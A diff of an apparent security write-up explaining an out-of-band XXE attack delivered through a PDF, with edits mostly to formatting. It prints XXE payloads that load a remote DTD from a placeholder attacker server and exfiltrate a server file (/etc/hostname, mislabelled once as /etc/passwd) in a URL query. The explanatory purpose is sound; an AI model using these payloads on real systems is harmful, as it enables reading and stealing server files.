@@ -94,19 +94,19 @@ The first payload is what I inserted in the PDF file:
 
 1. `<!ENTITY % ext SYSTEM "https://<attacker-server>/poc.dtd">`: This line defines a parameter entity named `%ext`. Parameter entities are used within the DTD itself. It instructs the XML parser to fetch the content from the remote URL `https://attacker-server/poc.dtd`.
 
-2. `%ext;`: This immediately triggers the parser to process the fetched DTD file.
+2. <b>%ext;</b>: This immediately triggers the parser to process the fetched DTD file.
 
 At this point, the vulnerable server makes an outbound HTTP request to the attacker's server to download poc.dtd. 
 
-The `poc.dtd` file, hosted on the attacker's server, contains the actual exfiltration code:
+The <b>poc.dtd</b> file, hosted on the attacker's server, contains the actual exfiltration code:
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">
 ```
-1. <!ENTITY % file SYSTEM "file:///etc/passwd">: The parser reads this line from the remote DTD. It defines another parameter entity, %file, which is instructed to read the contents of the <code>/etc/hostname</code> file from the victim server's filesystem.
+1. `<!ENTITY % file SYSTEM "file:///etc/passwd">`: The parser reads this line from the remote DTD. It defines another parameter entity, %file, which is instructed to read the contents of the <code>/etc/hostname</code> file from the victim server's filesystem.
 
-2. <!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">: This is a nested entity. It defines a parameter entity <b>%ent</b> whose value is the full declaration for a general entity named <b>data</b>. This nested entity is a key part of the attack because it ensures that the file content (%file) is read and included within the URL of the final request
+2. `<!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">`: This is a nested entity. It defines a parameter entity <b>%ent</b> whose value is the full declaration for a general entity named <b>data</b>. This part is key because it ensures the file content (%file) is read and included within the URL of the final call.
 
 
 
